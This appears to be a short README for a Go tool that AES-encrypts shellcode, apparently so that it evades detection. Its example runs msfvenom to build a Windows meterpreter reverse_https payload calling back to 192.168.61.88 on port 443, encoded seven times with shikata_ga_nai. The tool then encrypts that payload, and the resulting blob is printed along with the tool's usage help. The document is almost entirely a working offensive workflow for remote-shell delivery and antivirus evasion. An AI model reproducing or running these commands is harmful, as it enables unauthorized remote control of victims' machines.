# Module Shellcode Encrypt

```sh
$ cd shellcode-encrypt
$ go build 
$  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.61.88 LPORT=443 -e x86/shikata_ga_nai -i 7 -f hex > shellcode
$ ./aes-shellcode --do=enc --file=shellcode -key=1234567812345678
[+] Key :  1234567812345678
[!] Decode methode is base64(aes)
[+] Shellcode --> 6CHcaKMMcXuloYT+tD/BiuKTPc3QYFcxBf7h76nmneDmnR/E+0j6W+s+Wx+JOSaZpF2Iq4fRLNIgrRcAbOcKxmfgW488TuAgJdGbOjrQOK3LXb2S+HswLWol8YMETvPc9pLJeWFQIDZpQ1czLLToDcnofHywoDL8+EIkUXcQ57X7izzikkSnc+LEAK12hKFPJGixQbZDLDgDCJzt0UmW8cpbIeDHNiroa6HH8M+q9348XndHO6g3vAtY+0CSFRcH/FNCWFi0GLFdXovqQr2k4isEYSXG/CWkbclqRX7KUBwxsfptsvWfRe9gzIiNAlk8YEUMpPiKAyU18NLphH7Bk1yQXbfwVTpqAFJvTSKnfQE/2RoqjiOlSDrRYeILCc8GEnwBRhT2yaW5e0StF9o1m1FUsOuuXzANfVCUFaoPX17Q1DDJINSzbWbrd3QLrCTQ8YEmIFqUwPoFLiXUDgyde/sTVACjntgDgtgxxEnEQyTi7E+9ukqEWEa+mWUG3hqMN0pXlwJKCI0llgxwe/+GdV50ZeAvNxohQnYCcxz+7wowrUi+22TKUtnQhhb3PkfnsE5Jk0tA6dfZWgMEQ6Cng64HCxY1raFyR9ZmpSYeauFqhLVFbh2+J1Gz6MsLuGblU5wIvNCcd3Q0fvlxwemK7g7Ir9hqJRr9UMjMR4yEgRCyCtNIdpXUlz/SikwlcENUV+uF2zYFg4z7su7bg5WkbMJKO6oz750WmS+cxVlJCpNIFvui9GpHwKEhSjaAJfY3NQEhwmg0ajhmbaEwXn/0wrvOrbL9NL01W6YHIVY+NL0daF/iNRAmIvffHM5oVz543GHU/45V4GgOV5g9U0z8leB6Dp0tD1Kjh2tTHkyplarisDWKfugThmz7f5N64cKPTKrFNPdpaAgUIqv6wCrXH55xwLKghoQS5MZmOxxs9QKJutacMjU9oqLeTuz+OgfwubBNlSIOw596bQMTa2Rek3K5Qn760cdt/ZxNfarPZwEbHiYvpsn1iFzzVlgTIS5SFU3lfOhklEEcjOxH/35mjp2+nmNENB7YsUvq3vA7+F+tQ/9zsQJ/dsAZKFuCvjzXevWPU8f6tlYQr2spbZLMPiow0tnHlPjuERiBjkIR7dowiZYbyzIJRfchYGsIvR0rt0934j+5oQI6dcmXjd/jWDHXjHfBFQdvsr7ySntIQQNYaEj6by+lzBnuFbVGopUsSTPnv7PtjQzpXsPcT2LMjxNv97dmMGf4NO7xuwSUOQY98VnN2T/ZphNzwYJsvy7tLTcXCG8W2O6Cz9aqfzQy4kJ9/3LAa8LZCnCVCZZ3b1T+kCF06O8aLDs9C3D/k+KWVnir/bJHVUR+AYrm/a4LUux0KWxbA3K5usr7CGh7ROsFEEjP1EB3fg2nnpm9tpmnKeBwx0TSH7AtxMS3pmOuZwV8ID18BiHJSdvTf0vCVDmB6FC0BvQm2T177Ma6oorxoPbsBvMqzPmbE0jtNMFRV1CB/YDSc7KMtTKYqueabVZTDt/MwbCrfoID3qA7l6FxTXq8HRdRLBd5MoSM5B7S1yeBGxPLoK6bRQb0lDaMoeoysdNz95AjZxeXF3PHvlngpQT7g9zSz9YyiOCOzcClwTqfkQll5cpMWu3NIT+N5Lho8jP7m4QGBScys6p2iFPkf9N4wzmYApyKfmJpL364pQoDEFfGF7uiUdFqCKhkPoOLRhaSEY2Qaw3IU6E4NeVb66ZVcQ3j/IlrtdT3viMcf9IMviAtOj0+OfXqLD9hSVs=
```

untuk details
 ```sh
 $ ./shellcode-aes -h
Usage of ./aes-shellcode:
  -do string
    	example --do=enc or --do=dec (default "enc")
  -file string
    	location file shellcode with hex format (default "shellcode")
  -key string
    	key for enc or dec shellcode (default "1234567812345678")
 ```